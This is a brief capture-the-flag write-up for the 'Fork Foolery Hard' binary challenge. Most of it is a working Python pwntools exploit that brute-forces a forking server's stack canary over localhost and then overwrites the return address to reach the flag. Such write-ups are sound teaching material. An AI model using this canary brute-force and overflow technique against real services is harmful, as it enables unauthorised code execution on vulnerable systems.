![](img/Fork%20Foolery%20Hard-1780625142264.webp)

inspecting the pseudo code, we acknowledge that the process listen at local host, launching an instance of "challenge" each time a connection is received

note that the process doesnt actually restart each time an instance is launched, which means that the canary doesnt reset as long as the process isnt killed and restarted manually

with that in mind, a simple canary-bruteforcing script will suffice the challenge

```
#!/usr/bin/python3

from pwn import *

process("fork-foolery-hard")

context.timeout=1

payload=b"A"*0x38

canary=b"\x00"
l=len(canary)
cur=0


while l<8:
    zz=payload+canary+bytes([cur])
    print(zz)

    while True:
        try:
            p = remote("127.0.0.1", 1337)
            break
        except:
            time.sleep(1)
        
    p.recvuntil("Payload size: ")
    p.sendline(str(len(zz)).encode())
    p.recvuntil("bytes)!")
    p.send(zz)
    
    try:
        p.recvuntil("*** stack smashing detected ***")
        cur=cur+1
        if cur>255: cur=0
    except:
        canary=canary+bytes([cur])
        cur=0
        l=l+1
        print(l)

print(canary.hex())

context.log_level="debug"
payload=payload+canary+b"A"*8+b"\x1f\x56"

while True:
    while True:
        try:
            p = remote("127.0.0.1", 1337)
            break
        except:
            time.sleep(1)
        
    p.recvuntil("Payload size: ")
    p.sendline(str(len(payload)).encode())
    p.recvuntil("bytes)!")
    p.send(payload)
    
    try:
        p.recvuntil("flag")
        break
    except:
        pass
    
pause()
```